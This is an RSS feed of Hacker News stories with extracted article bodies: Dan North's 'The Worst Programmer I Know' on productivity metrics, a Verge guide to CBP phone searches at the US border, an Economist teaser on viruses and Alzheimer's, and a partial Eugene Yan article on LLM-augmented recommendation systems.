<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Sun, 23 Mar 2025 17:30:02 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[The Worst Programmer I Know (2023) (175 pts)]]></title>
            <link>https://dannorth.net/the-worst-programmer/</link>
            <guid>43452649</guid>
            <pubDate>Sun, 23 Mar 2025 13:08:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dannorth.net/the-worst-programmer/">https://dannorth.net/the-worst-programmer/</a>, See on <a href="https://news.ycombinator.com/item?id=43452649">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      
  
  


  <p>The great thing about measuring developer productivity is that you can quickly identify the bad programmers. I want to tell you about the worst programmer I know, and why I fought to keep him in the team.</p>
<p>A few years ago I wrote a Twitter/X thread about <a href="https://twitter.com/tastapod/status/1010461873270153216?s=20">the best programmer I know</a>, which I should write up as a blog post. It seems only fair to tell you about the worst one too. His name is <a href="https://www.linkedin.com/in/timmackinnon/">Tim Mackinnon</a> and I want you to know how <em>measurably unproductive</em> he is.</p>
<p>We were working for a well-known software consultancy at a Big Bank that decided to introduce individual performance metrics, “for appraisal and personal development purposes”. This was cascaded through the organisation, and landed in our team in terms of story points delivered. This was after some considered discussion from the department manager, who knew you shouldn’t measure things like lines of code or bugs found, because people can easily game these.</p>
<figure><img src="https://dannorth.net/the-worst-programmer/dilbert-bug-free-software-1024x311.gif" alt="Source: http://dilbert.com/strip/1995-11-13"><figcaption>
      <p><em>Source: <a href="http://dilbert.com/strip/1995-11-13">http://dilbert.com/strip/1995-11-13</a></em></p>
    </figcaption>
</figure>

<p>Instead we would measure stories delivered, or it may have been story points (it turns out it <a href="https://www.researchgate.net/publication/4106463_The_Slacker's_Guide_to_Project_Tracking_or_spending_time_on_more_important_things">doesn’t matter</a>), because these represented business value. We were using something like Jira, and people would put their name against stories, which made it super easy to generate these productivity metrics.</p>
<p>Which brings me to Tim. Tim’s score was consistently zero. Zero! Not just low, or trending downwards, but literally zero. Week after week, iteration after iteration. Zero points for Tim.</p>
<p>Well Tim clearly had to go. This was the manager’s conclusion, and he asked me to make the necessary arrangements to have Tim removed and replaced by someone who actually delivered, you know, stories.</p>
<p>And I flatly refused. It wasn’t even a hard decision for me, I just said no.</p>
<p>You see, the reason that Tim’s productivity score was zero, was that <em>he never signed up for any stories</em>. Instead he would spend his day pairing with different teammates. With less experienced developers he would patiently let them drive whilst nudging them towards a solution. He would not crowd them or railroad them, but let them take the time to learn whilst carefully crafting moments of insight and learning, often as <a href="https://en.wikipedia.org/wiki/Socratic_questioning">Socratic questions</a>, what ifs, how elses.</p>
<p>With seniors it was more like co-creating or sparring; bringing different worldviews to bear on a problem, to produce something better than either of us would have thought of on our own. Tim is a heck of a programmer, and you always learn something pairing with him.</p>
<p>Tim wasn’t delivering software; Tim was delivering a team that was delivering software. The entire team became more effective, more productive, more aligned, more idiomatic, more <em>fun</em>, because Tim was in the team.</p>
<p>I explained all this to the manager and invited him to come by and observe us working from time to time. Whenever he popped by, he would see Tim sitting with someone different, working on “their” thing, and you could be sure that the quality of that thing would be significantly better, and the time to value significantly lower—yes, you can have better and faster and cheaper, it just takes discipline—than when Tim wasn’t pairing with people.</p>
<p>In the end we kept Tim, and we quietly dropped the individual productivity metrics in favour of team accountability, where we tracked—and celebrated—the business impact we were delivering to the organisation as a high-performing unit.</p>
<h2 id="tldr">tl;dr
  <a href="#tldr"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M0 256C0 167.6 71.6 96 160 96h80c8.8 0 16 7.2 16 16s-7.2 16-16 16H160C89.3 128 32 185.3 32 256s57.3 128 128 128h80c8.8 0 16 7.2 16 16s-7.2 16-16 16H160C71.6 416 0 344.4 0 256zm576 0c0 88.4-71.6 160-160 160H336c-8.8 0-16-7.2-16-16s7.2-16 16-16h80c70.7 0 128-57.3 128-128s-57.3-128-128-128H336c-8.8 0-16-7.2-16-16s7.2-16 16-16h80c88.4 0 160 71.6 160 160zM152 240H424c8.8 0 16 7.2 16 16s-7.2 16-16 16H152c-8.8 0-16-7.2-16-16s7.2-16 16-16z"></path></svg></a></h2>
<p>Measure productivity by all means—I’m all for accountability—ideally as tangible business impact expressed in dollars saved, generated, or protected. This is usually hard, so proxy business metrics are fine too.</p>
<p>Just don’t try to measure the individual contribution of a unit in a complex adaptive system, because the premise of the question is flawed.</p>
<p>DORA metrics, for example, are about how the system of work works, whether as Westrum culture indicators or flow of technical change into production. They measure the engine, not the contribution of individual pistons, because that <a href="https://en.wikipedia.org/wiki/Chewbacca_defense">makes no sense</a>.</p>
<p>Also, if you ever get the chance to work with Tim Mackinnon, you should do that.</p>

  <section><em>We can help <strong>your</strong> organisation to go faster — <a href="https://dannorth.net/contact">ask us how</a></em>
</section>

  <section>
    
    <hyvor-talk-comments website-id="4330" page-id="/the-worst-programmer/" loading="lazy"></hyvor-talk-comments>
</section>

    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Is it safe to travel to the United States with your phone? (132 pts)]]></title>
            <link>https://www.theverge.com/policy/634264/customs-border-protection-search-phone-airport-rights</link>
            <guid>43452474</guid>
            <pubDate>Sun, 23 Mar 2025 12:31:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theverge.com/policy/634264/customs-border-protection-search-phone-airport-rights">https://www.theverge.com/policy/634264/customs-border-protection-search-phone-airport-rights</a>, See on <a href="https://news.ycombinator.com/item?id=43452474">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="zephr-anchor"><p>In recent weeks, airport Customs and Border Protection (CBP) agents have drawn public outcry for denying travelers US entry based on searches of their phones. A doctor on an H-1B visa was<a href="https://www.theverge.com/policy/632843/cbp-phone-search-airport-arrest-mass-deportations"> deported to Lebanon</a> after CBP found “sympathetic photos and videos” of Hezbollah leaders. A French scientist was turned away after a device search unearthed messages criticizing the Trump administration’s cuts to research programs, which officers said “conveyed hatred of Trump” and “could be qualified as terrorism.” As the administration ratchets up pressure to turn away even legal immigrants, its justifications are becoming thinner and thinner — but travelers can still benefit from knowing what are supposed to be their legal rights. </p><p>Your ability to decline a search depends on your immigration status — and, in some cases, on where and how you’re entering the country. Courts across the country have issued different rulings on device searches at ports of entry. But no matter your situation, there are precautions you can take to safeguard your digital privacy.</p><p>CBP device searches have historically been relatively rare. During the 2024 fiscal year, less than 0.01 percent of arriving international travelers had their phones, computers, or other electronic devices searched by CBP,<a href="https://www.cbp.gov/sites/default/files/2024-11/Border%20Search%20of%20Electronics%20at%20Ports%20of%20Entry%20FY%2024%20Statistics%20%28508%29.pdf"> according to the agency</a>. That year, CBP officers conducted 47,047 device searches. But even before this recent wave of incidents, inspections were on the rise: eight years earlier, during the 2016 fiscal year, CBP searched only 19,051 devices.</p><div><p id="the-border-search-exception"><h2>The “border search” exception</h2></p></div><p>The Supreme Court<a href="https://www.oyez.org/cases/2013/13-132"> ruled</a> in 2014 that warrantless searches of people’s cell phones violated the Fourth Amendment. But there’s one exception to that rule: searches that happen at the border. The courts have held that border searches “are reasonable simply because they occur at the border,” meaning in most cases, CBP and Border Patrol don’t need a warrant to look through travelers’ belongings — including their phones. That exception applies far beyond the US’s literal borders, since airports are considered border zones, too.</p><p>“Traditionally, the border search exception to the Fourth Amendment allowed customs officers to search things like luggage. The idea was whatever you’re taking with you is pertinent to your travel,” Saira Hussain, a senior staff attorney at the Electronic Frontier Foundation, told <em>The Verge</em>. The point was to look for people or things that were inadmissible into the country.</p><div><p>“It can show every facet of your life.”</p></div><p>These days, most travelers are carrying a lot more in their pockets — not only information stored on a phone’s hardware, but anything that’s accessible on it with a data connection. “When you look at devices, the data that you carry with you isn’t just pertinent to your travel. This data can precede your travel by over a decade because of how much information is stored on the cloud,” Hussain said. “It can show every facet of your life. It can show your financial history, your medical history, your communications with your doctor and your attorney. It can reveal so much information that is not analogous at all to the notion of a customs officer looking through your luggage.” Privacy advocates have warned of this issue for years, but in an environment where officers are seeking any pretext to turn someone away, it’s an even bigger problem.</p><p>If you’re a US citizen, “you have the right to say no” to a search, “and they are not allowed to bar you from the country,” Hussain said. But if you refuse, CBP can still take your phone, laptop, or other devices and hold onto them.</p><p>Permanent residents can similarly refuse a search, but with complicating factors. If someone with a green card leaves the US for more than 180 days, they’re screened for “inadmissibility” — reasons they may be barred from entry — upon returning to the country. Green card holders who have certain offenses on their record may also be deemed inadmissible. That appears to have been the case with Fabian Schmidt, a<a href="https://www.wgbh.org/news/local/2025-03-14/green-card-holder-from-new-hampshire-interrogated-at-logan-airport-detained"> permanent resident whose family said he was “violently interrogated”</a> by CBP agents at Boston Logan Airport after returning from a trip to Europe. Because of these factors, permanent residents may not feel comfortable refusing a search, even if doing so wouldn’t bar them from entering the country. </p><p>Visa holders have fewer rights at ports of entry, and refusing a search could lead to them being denied entry to the country. </p><div><p id="how-deep-is-the-search"><h2>How deep is the search?</h2></p></div><p>There are two types of device searches CBP officers can conduct: basic and forensic, or advanced. “There’s a distinction that the government draws between searching your phone and just looking at whatever is on it, versus connecting your phone to external equipment to search it using advanced algorithms or to copy the contents of your phone,” Hussain said.</p><p>The government maintains that it doesn’t need a warrant to conduct “basic” searches of the contents of a person’s phone. During these searches, Hussain explained, agents are supposed to put your phone on airplane mode and can only look at what is accessible offline — but that can still be a lot of information, including any cloud data that’s currently synced.</p><p>“While forensic inspections are powerful, a lot of mischief can happen through the physical, ‘thumbing-through’ inspections that law enforcement can engage in,” Tom McBrien, counsel at the Electronic Privacy Information Center, also told <em>The Verge</em>.</p><div><p>“A lot of mischief can happen through the physical, ‘thumbing-through’ inspections that law enforcement can engage in”</p></div><p>For the most part, courts have avoided the question of whether CBP can conduct warrantless basic searches of a person’s phone or laptop, effectively allowing the agency to do so. But there’s one geographic exception to this rule. Last year, a federal judge in New York’s Eastern District<a href="https://www.theverge.com/2024/7/29/24209130/customs-border-protection-unlock-phone-warrant-new-york-jfk"> ruled that CBP can’t conduct any warrantless searches</a> of travelers’ devices. That ruling doesn’t apply anywhere else in the country, but the district includes John F. Kennedy Airport in Queens — the sixth-busiest airport in the US. That ruling applies to both basic and forensic inspections.</p><p>Elsewhere in the country, judges have imposed some limitations on advanced searches. Warrantless forensic searches are allowed in some places and prohibited in others, depending on how different federal circuit courts rule. The Supreme Court could clear this up with a ruling that applies nationwide, but it’s avoided the question for years. </p><p>“Your rights will be different depending on whether you’re on a flight landing in Boston Logan in the First Circuit or Reagan/Dulles in the Fourth Circuit,” McBrien said. “Similarly, your rights would be different if you’re crossing the border in Arizona (Ninth Circuit) or New Mexico (Tenth Circuit). This does not make a lot of sense, but the Supreme Court has consistently declined to address these disparities by consistently denying petitions for certiorari in cases that have teed the question up.”</p><p>Some courts have been more permissive than others. The Ninth Circuit — which includes Alaska, Arizona, California, Hawaii, Idaho, Montana, Nevada, Oregon, and Washington — prohibits warrantless forensic searches unless officers are looking for “digital contraband,” such as child sexual abuse material. The Fourth Circuit — covering Maryland, North Carolina, South Carolina, Virginia, and West Virginia — prohibits warrantless forensic searches unless officers are looking for information related to ongoing border violations, such as human smuggling or drug trafficking. </p><p>In 2023, a federal judge in the Southern District of New York<a href="https://www.techdirt.com/2023/05/23/federal-judge-says-riley-applies-at-border-warrants-are-needed-for-some-cell-phone-searches/"> ruled</a> that the border search exception doesn’t extend to forensic searches, for which warrants are needed. (Oddly, the case in question involved a phone search at Newark Liberty Airport in New Jersey, a state that is in a different federal circuit from New York.) These searches, judge Jed Rakoff wrote, “extend the Government’s reach far beyond the person and luggage of the border-crosser — as if the fact of a border crossing somehow entitled the Government to search that traveler’s home, car, and office.”</p><div><p>Malik’s phone was taken even though he’s enrolled in Global Entry</p></div><p>Not all judges agree. In 2021, Adam Malik, an immigration lawyer, <a href="https://www.techdirt.com/2021/02/02/texas-immigration-lawyer-sues-dhs-cbp-over-seizure-search-his-work-phone/">sued CBP</a> after agents at Dallas Fort Worth International Airport seized his phone and searched the contents without a warrant. According to the lawsuit, Malik’s phone was taken even though he’s enrolled in Global Entry, CBP’s trusted traveler program. Because the agents couldn’t bypass Malik’s password, they sent the phone to a forensics lab, which extracted all the phone’s data.</p><p>A federal court ruled in favor of DHS, saying the warrantless search hadn’t violated Malik’s rights. When Malik appealed to the Fifth Circuit — which covers Louisiana, Mississippi, and Texas — the judges held that the search didn’t require a warrant. But the court also expressed “no view on how the border-search exemption may develop or be clarified in future cases.” </p><p>In other words, the constitutionality of these searches is still an open question — and CBP won’t stop conducting them until and unless it’s expressly forbidden from doing so.</p><p>These distinctions matter because they determine a person’s basis for challenging device inspections in court. But given the Trump administration’s recent track record of ignoring the law and flouting judicial orders, limiting what can be found on your phone is a safer bet than suing the government over an unlawful search after the fact.</p><div><p id="safeguarding-your-data"><h2>Safeguarding your data </h2></p></div><p>Instead of trying to game out what rights you have depending on your immigration status and what airport you’re flying into (or what land border you’re crossing), the best way to keep your devices safe from CBP is to limit what’s on them.</p><p>“We always encourage data minimization when crossing the border; you want to travel with the least amount of data possible,” Hussain said. </p><p>Before traveling, you should encrypt your devices and make sure you’re using secure passwords. Travelers should disable biometric logins like Face ID, since some courts have ruled that <a href="https://www.theverge.com/2024/9/24/24252235/police-unlock-phone-password-face-id-apple-wallet-id">police can’t compel you to tell them your password</a> but they <em>can</em> use biometrics to unlock your phone. </p><div><p>Travelers should disable biometric logins like Face ID</p></div><p>The EFF<a href="https://ssd.eff.org/module/things-consider-when-crossing-us-border"> recommends</a> that travelers limit what can be found during basic phone or laptop searches by uploading their data onto the cloud and deleting it off their device — and ensuring that it’s <em>fully</em> been removed, since agents can also look through your phone’s “recently deleted” files during basic searches. Customs agents are supposed to keep your phone on airplane mode while they conduct a basic search, but that still lets them see any cached emails, text messages, and other communications. The best way to safeguard this information is to back it up onto the cloud and then wipe your phone or laptop entirely.</p><p>Backing up sensitive or personal data doesn’t just prevent others from accessing your device; it also ensures you don’t lose that data if CBP seizes your phone or computer. McBrien also suggests that people turn their phones off when they’re crossing the border or at the airport. “Turning the phone off means that when you turn it back on, it requires a passcode whether or not you use FaceID or other biometric measures,” McBrien said.</p><p>In a better legal environment, these precautions wouldn’t be the only meaningful shield between you and a border search. “Without strong constitutional and statutory protections, personal choices about how to configure one’s device and apps can only mitigate — not eliminate — the dangers that border device searches pose to their privacy and speech rights,” McBrien said. For now, if CBP really wants to look through your phone, they’ll likely find a way. But you can still protect yourself as much as possible. </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Do Viruses Trigger Alzheimer's? (139 pts)]]></title>
            <link>https://www.economist.com/science-and-technology/2025/03/17/do-viruses-trigger-alzheimers</link>
            <guid>43451397</guid>
            <pubDate>Sun, 23 Mar 2025 07:29:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.economist.com/science-and-technology/2025/03/17/do-viruses-trigger-alzheimers">https://www.economist.com/science-and-technology/2025/03/17/do-viruses-trigger-alzheimers</a>, See on <a href="https://news.ycombinator.com/item?id=43451397">Hacker News</a></p>
<div id="readability-page-1" class="page"><section><div><p><span><a href="https://www.economist.com/science-and-technology" data-analytics="sidebar:section"><span>Science &amp; technology</span></a></span><span> | <!-- -->Going viral</span></p></div><h2>A growing group of scientists think so, and are asking whether antivirals could treat the disease</h2></section><div><div><p><time datetime="2025-03-17T13:56:11.552Z"> <!-- -->Mar 17th 2025</time></p></div><section><p data-component="paragraph"><span data-caps="initial">I</span><small>n the summer</small> of 2024 several groups of scientists published a curious finding: people vaccinated against shingles were less likely to develop dementia than their unvaccinated peers. Two of the papers came from the lab of Pascal Geldsetzer at Stanford University. Analysing medical records from Britain and Australia, the researchers concluded that around a fifth of dementia diagnoses could be averted through the original shingles vaccine, which contains live varicella-zoster virus. Two other studies, one by <small>GSK</small>, a pharmaceutical company, and another by a group of academics in Britain, also reported that a newer “recombinant” vaccine, which is more effective at preventing shingles than the live version, appeared to confer even greater protection against dementia.</p></section><p><h3 id="article-tags">Explore more</h3><nav aria-labelledby="article-tags"><a href="https://www.economist.com/topics/science-and-technology" data-analytics="tags:science_and_technology"><span>Science &amp; technology</span></a><a href="https://www.economist.com/topics/health-care" data-analytics="tags:health_care"><span>Health care</span></a><a href="https://www.economist.com/topics/science" data-analytics="tags:science"><span>Science</span></a></nav></p><p>This article appeared in the Science &amp; technology section of the print edition under the headline “A viral hypothesis”</p><div data-test-id="chapterlist" data-tracking-id="content-well-chapter-list"><div><hr data-testid="rule-accent"><div><h3><a href="https://www.economist.com/science-and-technology" text="Science &amp; technology" data-analytics="chapter_list_header:Science &amp; technology">Science &amp; technology</a></h3><p><span>March 22nd 2025</span></p></div></div><ul><li><a href="https://www.economist.com/science-and-technology/2025/03/17/do-viruses-trigger-alzheimers" id="f535323c-b434-437a-a67e-515be93d1279" data-analytics="article:reports_headline:1" data-test-id="chapterlist-link-0"><span data-testid="right-economist-red-false"><span>→</span></span><span>Do viruses trigger Alzheimer’s?</span></a></li><li><a href="https://www.economist.com/science-and-technology/2025/03/20/why-dont-seals-drown" id="d9852625-3b65-404b-b2d7-c4b88bb8ed4a" data-analytics="article:reports_headline:2" data-test-id="chapterlist-link-1"><span data-testid="right-london-5-false"><span>→</span></span><span>Why don’t seals drown?</span></a></li><li><a href="https://www.economist.com/science-and-technology/2025/03/19/rumours-on-social-media-could-cause-sick-people-to-feel-worse" id="4d9108ca-aba1-4f83-a18e-d965447ea258" data-analytics="article:reports_headline:3" data-test-id="chapterlist-link-2"><span data-testid="right-london-5-false"><span>→</span></span><span>Rumours on social media could cause sick people to feel worse</span></a></li><li><a href="https://www.economist.com/science-and-technology/2025/03/19/can-people-be-persuaded-not-to-believe-disinformation" id="86eba9e8-d2f2-4c81-b71c-0704e4f6dbe8" data-analytics="article:reports_headline:4" data-test-id="chapterlist-link-3"><span data-testid="right-london-5-false"><span>→</span></span><span>Can people be persuaded not to believe disinformation? </span></a></li><li><a href="https://www.economist.com/science-and-technology/2025/03/14/what-is-the-best-way-to-keep-your-teeth-healthy" id="dae17e3a-d717-4c4f-83b6-1fa9da5c7bf8" data-analytics="article:reports_headline:5" data-test-id="chapterlist-link-4"><span data-testid="right-london-5-false"><span>→</span></span><span>What is the best way to keep your teeth healthy?</span></a></li></ul></div><div orientation="vertical" data-test-id="vertical"><div orientation="vertical"><figure><img loading="lazy" width="1280" height="1709" decoding="async" data-nimg="1" sizes="300px" srcset="https://www.economist.com/cdn-cgi/image/width=16,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg 16w, https://www.economist.com/cdn-cgi/image/width=32,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg 32w, https://www.economist.com/cdn-cgi/image/width=48,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg 48w, https://www.economist.com/cdn-cgi/image/width=64,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg 64w, https://www.economist.com/cdn-cgi/image/width=96,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg 96w, https://www.economist.com/cdn-cgi/image/width=128,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg 128w, https://www.economist.com/cdn-cgi/image/width=256,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg 256w, https://www.economist.com/cdn-cgi/image/width=360,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg 360w, https://www.economist.com/cdn-cgi/image/width=384,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg 384w, https://www.economist.com/cdn-cgi/image/width=480,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg 480w, https://www.economist.com/cdn-cgi/image/width=600,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg 600w, https://www.economist.com/cdn-cgi/image/width=834,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg 834w, https://www.economist.com/cdn-cgi/image/width=960,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg 960w, https://www.economist.com/cdn-cgi/image/width=1096,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg 1096w, https://www.economist.com/cdn-cgi/image/width=1280,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg 1280w, https://www.economist.com/cdn-cgi/image/width=1424,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg 1424w" src="https://www.economist.com/cdn-cgi/image/width=1424,quality=80,format=auto/content-assets/images/20250322_DE_EU.jpg"></figure></div><div orientation="vertical"><h3 orientation="vertical">From the March 22nd 2025 edition</h3><p orientation="vertical">Discover stories from this section and more in the list of contents</p><p><a href="https://www.economist.com/weeklyedition/2025-03-22" data-analytics="sidebar:weekly_edition"><span data-testid="right-economist-red-true"><span>⇒</span></span><span>Explore the edition</span></a></p></div></div><div><a href="https://s100.copyright.com/AppDispatchServlet?publisherName=economist&amp;publication=economist&amp;title=Do%20viruses%20trigger%20Alzheimer%E2%80%99s%3F&amp;publicationDate=2025-03-17&amp;contentID=%2Fcontent%2Fubbrfahbhj8pvu7grmt7e88egdiohic7&amp;type=A&amp;orderBeanReset=TRUE" target="_blank" rel="noreferrer" data-analytics="end_of_article:reuse_this_content"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" data-testid="renew-outline"><path fill="var(--mb-colour-base-chicago-45)" d="M5.1 16.05a8.25 8.25 0 0 1-.825-1.95A7.696 7.696 0 0 1 4 12.05c0-2.233.775-4.133 2.325-5.7C7.875 4.783 9.767 4 12 4h.175l-1.6-1.6 1.4-1.4 4 4-4 4-1.4-1.4 1.6-1.6H12c-1.667 0-3.083.588-4.25 1.763C6.583 8.938 6 10.367 6 12.05c0 .433.05.858.15 1.275.1.417.25.825.45 1.225l-1.5 1.5ZM12.025 23l-4-4 4-4 1.4 1.4-1.6 1.6H12c1.667 0 3.083-.587 4.25-1.762C17.417 15.063 18 13.633 18 11.95c0-.433-.05-.858-.15-1.275-.1-.417-.25-.825-.45-1.225l1.5-1.5c.367.633.642 1.283.825 1.95.183.667.275 1.35.275 2.05 0 2.233-.775 4.133-2.325 5.7C16.125 19.217 14.233 20 12 20h-.175l1.6 1.6-1.4 1.4Z"></path></svg><span>Reuse this content</span></a></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Improving recommendation systems and search in the age of LLMs (276 pts)]]></title>
            <link>https://eugeneyan.com/writing/recsys-llm/</link>
            <guid>43450732</guid>
            <pubDate>Sun, 23 Mar 2025 03:40:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://eugeneyan.com/writing/recsys-llm/">https://eugeneyan.com/writing/recsys-llm/</a>, See on <a href="https://news.ycombinator.com/item?id=43450732">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            



<!--https://docs.mathjax.org/en/latest/input/tex/delimiters.html-->

<p>Recommendation systems and search have historically drawn inspiration from language modeling. For example, the adoption of <a href="https://arxiv.org/abs/2009.12192" target="_blank">Word2vec</a> to learn item embeddings (for embedding-based retrieval), and using <a href="https://arxiv.org/abs/1511.06939" target="_blank">GRUs</a>, <a href="https://arxiv.org/abs/1905.06874" target="_blank">Transformer</a>, and <a href="https://arxiv.org/abs/1904.06690" target="_blank">BERT</a> to predict the next best item (for ranking). The current paradigm of large language models is no different.</p>

<p>Here, we’ll discuss how industrial search and recommendation systems have evolved over the past year or so and cover model architectures, data generation, training paradigms, and unified frameworks:</p>
<ul>
  <li><a href="#llmmultimodality-augmented-model-architecture">LLM/multimodality-augmented model architecture</a></li>
  <li><a href="#llm-assisted-data-generation-and-analysis">LLM-assisted data generation and analysis</a></li>
  <li><a href="#scaling-laws-transfer-learning-distillation-loras">Scaling Laws, transfer learning, distillation, LoRAs, etc.</a></li>
  <li><a href="#unified-architectures-for-search-and-recommendations">Unified architectures for search and recommendations</a></li>
</ul>

<h2 id="llmmultimodality-augmented-model-architecture">LLM/multimodality-augmented model architecture</h2>

<p>Recommendation models are increasingly adopting language models and multimodal content to overcome traditional limitations of ID-based approaches. These hybrid architectures include content understanding alongside the strengths of behavioral modeling, addressing the common challenges of cold-start and long-tail item recommendations.</p>

<p><strong><a href="https://arxiv.org/abs/2306.08121" target="_blank">Semantic IDs (YouTube)</a> explores content-derived features as substitutes for traditional hash-based IDs.</strong> This approach targets difficulties in predicting user preferences for new and infrequently interacted items. Their solution involves a two-stage framework.</p>

<p>In the first stage, a transformer-based video encoder (similar to Video-BERT) generates dense content embeddings. These embeddings are then compressed into discrete Semantic IDs through a Residual Quantization Variational AutoEncoder (RQ-VAE). Representing user histories with these compact semantic IDs—a few integers rather than high-dimensional embeddings—significantly improves efficiency. Once trained, the RQ-VAE is frozen and used to generate Semantic IDs for the second stage to train a production-scale ranking model.</p>

<p>The RQ-VAE itself is a single-layer encoder-decoder structure with a 256-dimensional latent space. It has eight quantization levels with a codebook of 2048 entries per level. The encoder maps content embeddings to a latent vector, while a residual quantizer discretizes this vector, and the decoder reconstructs the original embedding. The initial embeddings originate from a transformer with a VideoBERT backbone, producing detailed, 2048-dimensional representations that capture the topical content in video.</p>

<p><img src="https://eugeneyan.com/assets/semantic-ids-fig1.jpg" loading="lazy" title="Semantic IDs" alt="Semantic IDs"></p>

<p>To integrate Semantic IDs into ranking models, the authors propose two techniques: an N-gram-based approach, which groups fixed-length sequences, and a SentencePiece Model (SPM)-based method that adaptively learns variable-length subwords. The ranking model is a multi-task production ranking model that recommends the next video to watch given the current video and user history.</p>

<p><strong>Results:</strong> Directly using the dense content embeddings performed worse than using random hash IDs. The authors hypothesize that ranking models heavily rely on memorization from the ID-based embedding tables—replacing these with <em>fixed</em> dense content embeddings led to poorer CTR. However, both N-gram and SPM methods did better than random hashing, especially in cold-start scenarios. Ablation tests revealed that while N-gram approaches had a slight advantage when embedding table sizes were limited (e.g., $8 \times K$ or $4 \times K^2$), SPM methods offered superior generalization and efficiency with larger embedding tables.</p>

<p><img src="https://eugeneyan.com/assets/semantic-ids-fig2.jpg" loading="lazy" title="Semantic IDs" alt="Semantic IDs"></p>
<p>Dense content embeddings (dashed lines) perform worse than random hashing (solid orange).</p>

<p>Similarly,&nbsp;<strong><a href="https://dl.acm.org/doi/10.1145/3640457.3688098" target="_blank">M3CSR (Kuaishou)</a> introduces multimodal content embeddings (visual, textual, audio) clustered via K-means into trainable category IDs.</strong> This transforms static content embeddings into adaptable, behavior-aligned representations.</p>

<p>The M3CSR framework has a dual-tower architecture, splitting user-side and item-side towers to optimize for online inference efficiency where user and item embeddings can be pre-computed and indexed via approximate nearest neighbor indices. Item embeddings are derived from multimodal pretrained models—ResNet for visual, Sentence-BERT for text, and VGGish for audio—and concatenated into a single embedding vector. These vectors are then clustered using K-means (with approximately 1,000 clusters from over 10 million videos).</p>

<p><img src="https://eugeneyan.com/assets/m3csr-fig2.jpg" loading="lazy" title="M3CSR" alt="M3CSR"></p>

<p>Next, cluster IDs are embedded through a Modal Encoder, a dense network translating content features into behaviorally aligned spaces and assigning trainable embeddings. The Modal Encoder uses a dense network to learn the mapping from content-space to behavior space and a cluster ID lookup to assign a trainable cluster ID embedding.</p>

<p><img src="https://eugeneyan.com/assets/m3csr-fig3.jpg" loading="lazy" title="M3CSR" alt="M3CSR"></p>

<p>On the user side, M3CSR learns on user behavior sequences to train sequential models that capture user preferences. In addition, to accurately model user modality preferences, the framework concatenates general behavioral interests with modality-specific interests. These modality-specific interests are derived by converting item IDs back into their multimodal embeddings using the same Modal Encoder.</p>

<p><strong>Results:</strong> M3CSR outperformed several multimodal baselines such as VBPR, MMGCN, and LATTICE. Ablation studies highlighted the importance of modeling modality-specific user interests and demonstrated consistent superiority of multimodal features over single-modal features across datasets (Amazon, TikTok, Allrecipes). A/B testing measured that clicks increased by 3.4%, likes by 3.0%, and follows by 3.1%. In cold-start scenarios, M3CSR also showed improved performance, achieving a 1.2% boost in cold-start velocity and a 3.6% increase in cold-start video coverage.</p>

<p><strong><a href="https://arxiv.org/abs/2310.19453" target="_blank">FLIP (Huawei)</a> shows how to align ID-based recommendation models with LLMs by jointly learning from masked tabular and language data.</strong> The core idea is to reconstruct masked features from one modality (user and item IDs) using information from another modality (text tokens), ensuring tight cross-modal alignment.</p>

<p>FLIP operates in three stages: modality transformation, modality alignment pretraining, and adaptive finetuning. First, tabular data is translated into text using structured prompt templates. Then, joint masked language/tabular modeling is conducted to achieve fine-grained alignment between modalities. During pretraining, textual data undergoes field-level masking (replacing entire fields with <code>[MASK]</code> tokens), while corresponding tabular features are masked by substituting feature IDs with <code>[MASK]</code>.</p>

<p>FLIP trains two parallel models with three objectives: (i) Masked Language Modeling (MLM) predicts masked text tokens using complete tabular context; (ii) Masked Tabular Modeling (MTM) predicts masked feature IDs leveraging textual data; and (iii) Instance-level Contrastive Learning (ICL) aligns global representations across modalities.</p>

<p><img src="https://eugeneyan.com/assets/flip-fig1.jpg" loading="lazy" title="FLIP" alt="FLIP"></p>

<p>Finally, the aligned models—TinyBERT as the LLM and DCNv2 as the ID-based model—are finetuned on the downstream click-through rate (CTR) prediction task. To do this, FLIP adds randomly initialized output layers on both models to estimate click probabilities. The final prediction is a weighted sum of both models’ outputs, where the weights are learned adaptively during training.</p>

<p><img src="https://eugeneyan.com/assets/flip-fig2.jpg" loading="lazy" title="FLIP" alt="FLIP"></p>

<p><strong>Results:</strong> FLIP outperforms the baselines of ID-only, LLM-only, and ID+LLM models. Ablation studies show that (i) both MLM and MTM objectives improve performance, (ii) field-level masking is more effective than random token masking, and (iii) joint reconstruction between modalities is key.</p>

